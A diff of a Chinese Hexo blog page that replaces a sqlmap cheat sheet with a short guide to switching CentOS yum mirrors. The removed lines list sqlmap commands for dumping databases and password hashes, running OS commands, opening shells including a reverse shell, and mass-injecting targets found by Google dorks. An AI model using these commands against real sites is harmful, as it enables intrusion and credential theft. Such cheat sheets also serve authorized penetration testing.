@@ -4,27 +4,24 @@
   <meta charset="utf-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <title>SQLMAP常用参数 | Hexo</title>
+  <title>更改yum源 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#获取当前用户名称sqlmap -u “http://url?id=1“ - -current-user 
-#获取当前数据库名称sqlmap -u “http://url?id=1“ - -current-db 
-#列出给定数据库的所有表sqlmap -u “http://url?id=1“ -D “db_name” - -tables 
-#列出指定库和指定表的所有列sqlmap -u “http">
+  <meta name="description" content="##简单三步完成yum源的更改
+###1、首先备份/etc/yum.repos.d/CentOS-Base.repo1命令：mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo_backup
+###2、根据CentOS不同版本选择下载对应的repo文件，放到/etc/yum.repos.d/ 目录12命令：cd">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQLMAP常用参数">
-<meta property="og:url" content="http://yoursite.com/2016/05/22/SQLMAP常用参数/index.html">
+<meta property="og:title" content="更改yum源">
+<meta property="og:url" content="http://yoursite.com/2016/08/04/更改yum源/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="#获取当前用户名称sqlmap -u “http://url?id=1“ - -current-user 
-#获取当前数据库名称sqlmap -u “http://url?id=1“ - -current-db 
-#列出给定数据库的所有表sqlmap -u “http://url?id=1“ -D “db_name” - -tables 
-#列出指定库和指定表的所有列sqlmap -u “http">
-<meta property="og:updated_time" content="2016-07-23T13:37:31.104Z">
+<meta property="og:description" content="##简单三步完成yum源的更改
+###1、首先备份/etc/yum.repos.d/CentOS-Base.repo1命令：mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo_backup
+###2、根据CentOS不同版本选择下载对应的repo文件，放到/etc/yum.repos.d/ 目录12命令：cd">
+<meta property="og:updated_time" content="2016-08-04T09:14:44.031Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQLMAP常用参数">
-<meta name="twitter:description" content="#获取当前用户名称sqlmap -u “http://url?id=1“ - -current-user 
-#获取当前数据库名称sqlmap -u “http://url?id=1“ - -current-db 
-#列出给定数据库的所有表sqlmap -u “http://url?id=1“ -D “db_name” - -tables 
-#列出指定库和指定表的所有列sqlmap -u “http">
+<meta name="twitter:title" content="更改yum源">
+<meta name="twitter:description" content="##简单三步完成yum源的更改
+###1、首先备份/etc/yum.repos.d/CentOS-Base.repo1命令：mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo_backup
+###2、根据CentOS不同版本选择下载对应的repo文件，放到/etc/yum.repos.d/ 目录12命令：cd">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -206,11 +203,11 @@
 	</div>
 </nav>
 
-      <div class="body-wrap"><article id="post-SQLMAP常用参数" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-更改yum源" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/05/22/SQLMAP常用参数/" class="article-date">
-  	<time datetime="2016-05-22T03:15:14.000Z" itemprop="datePublished">2016-05-22</time>
+      <a href="/2016/08/04/更改yum源/" class="article-date">
+  	<time datetime="2016-08-04T09:07:06.000Z" itemprop="datePublished">2016-08-04</time>
 </a>
     </div>
   
@@ -223,7 +220,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      SQLMAP常用参数
+      更改yum源
     </h1>
   
 
@@ -239,30 +236,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#获取当前用户名称<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -current-user </p>
-<p>#获取当前数据库名称<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -current-db </p>
-<p>#列出给定数据库的所有表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” - -tables </p>
-<p>#列出指定库和指定表的所有列<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “tablename” - -columns </p>
-<p>#获取指定数据库指定表指定列的内容<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “table_name” -C “column_name1,column_name2” - -dump </p>
-<p>#确定是否为DBA<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -is-dba </p>
-<p>#查看权限<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -privileges </p>
-<p>#获取所有数据库用户密码<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -passwords </p>
-<p>#列出指定用户数据库密码<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -passwords -U username </p>
-<p>#列出所有数据库用户角色<br> sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -roles </p>
-<p>#列出所有数据库用户<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -users </p>
-<p>#列出所有数据库名<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -dbs </p>
-<p>#查看指定用户权限<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -privileges -U username </p>
-<p>#导出所有数据库所有表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -dump-all </p>
-<p>#导出指定字段的20条数据<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “tablename” -C “password,user,id” - -dump - -start 1 - -stop 20 </p>
-<p>#导入用户自定义函数（获取系统权限！）<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -udf-inject </p>
-<p>#post注入<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -data “id=3”</p>
-<p>#代理注入<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -proxy “<a href="http://127.0.0.1:8118" target="_blank" rel="external">http://127.0.0.1:8118</a>“</p>
-<p>#执行系统命令<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-cmd=whoami </p>
-<p>#系统交互<br>shellsqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-shell </p>
-<p>#执行指定sql命令<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -sql-shell </p>
-<p>#反弹shell<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-pwn </p>
-<p>#读取win系统注册表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -reg-read </p>
-<p>#google搜索注入点自动跑出所有字段攻击实例<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -g “Google dork” - -dump-all - -batch</p>
+        <p>##简单三步完成yum源的更改</p>
+<p>###1、首先备份/etc/yum.repos.d/CentOS-Base.repo<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo_backup</div></pre></td></tr></table></figure></p>
+<p>###2、根据CentOS不同版本选择下载对应的repo文件，放到/etc/yum.repos.d/ 目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">命令：<span class="built_in">cd</span> /etc/yum.repos.d/</div><div class="line">      wget http://mirrors.163.com/.help/CentOS6-Base-163.repo</div></pre></td></tr></table></figure></p>
+<p>###3、最后执行yum makecache生成缓存<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：yum makecache</div></pre></td></tr></table></figure></p>
+<p>好了，yum源的更改已经完成</p>
 
       
     </div>
@@ -272,18 +250,9 @@
     
 <nav id="article-nav">
   
-    <a href="/2016/08/04/Linux常用命令/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          Linux常用命令（1）
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/04/21/Github的搭建/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Github的搭建</div>
+    <a href="/2016/08/04/Linux常用命令/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux常用命令（1）</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -318,7 +287,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="SQLMAP常用参数" data-title="SQLMAP常用参数" data-url="http://yoursite.com/2016/05/22/SQLMAP常用参数/"></div>
+	<div class="ds-thread" data-thread-key="更改yum源" data-title="更改yum源" data-url="http://yoursite.com/2016/08/04/更改yum源/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
